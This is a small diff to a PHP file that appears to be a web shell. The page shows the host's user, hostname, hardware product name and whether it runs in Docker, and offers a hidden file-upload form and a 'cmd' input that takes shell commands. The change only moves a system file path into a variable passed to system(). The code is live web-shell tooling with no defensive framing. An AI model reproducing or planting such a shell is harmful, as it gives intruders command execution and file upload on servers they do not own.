@@ -87,6 +87,7 @@
 		$hn = system('hostname');
 		$prompt = "[" . $usr . "@" . $hn . "]->";
 	 	$date = date('Y-m-d H:i:s');
+		$type = '/sys/class/dmi/id/product_name';
 	 	if (file_exists('/.dockerenv')) {
 	 		$dock = "True";
 	 	}else {
@@ -107,7 +108,7 @@
 
 	 ?>
 	<div class="container">
-		<div class="info"><?php echo "Date : " .$date; echo "<br> Product : ";system('cat /sys/class/dmi/id/product_name');echo "<br> In Docker : " . $dock; ?><br><form id="form" method="POST" enctype="multipart/form-data" ><p onclick="document.getElementById('up').click()">/upload</p> <input type="file" value="up" name="up" id="up" style="visibility:hidden;" onclick="crbtn()"><br></form></div>
+		<div class="info"><?php echo "Date : " .$date; echo "<br> Product : ";system('cat ' . $type);echo "<br> In Docker : " . $dock; ?><br><form id="form" method="POST" enctype="multipart/form-data" ><p onclick="document.getElementById('up').click()">/upload</p> <input type="file" value="up" name="up" id="up" style="visibility:hidden;" onclick="crbtn()"><br></form></div>
 		<form  method="POST" autocomplete="off" >
 			<p style="color: snow;font-family: Courier, monospace;"><?php echo $prompt ?></p><input style="color: snow;font-family: Courier, monospace" type="name" name="cmd"  placeholder="" autocomplete="false" ><i></i>
 			
